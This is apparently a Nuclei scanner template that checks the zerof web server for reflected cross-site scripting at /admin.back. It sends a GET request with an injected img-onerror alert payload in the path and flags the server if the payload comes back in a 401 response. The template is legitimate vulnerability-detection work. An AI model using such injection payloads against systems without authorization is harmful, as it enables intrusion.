id: zerof-web-server-admin-xss
info:
  author: "Master\u5148\u751F"
  name: zerof web server /admin.back XSS
  severity: low
  tags: zerof,xss
requests:
- matchers:
  - status:
    - 401
    type: status
  - part: body
    type: word
    words:
    - <img src=a onerror=alert('{{randstr}}')>
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/admin.back<img src=a onerror=alert(''{{randstr}}'')>'
  redirects: false
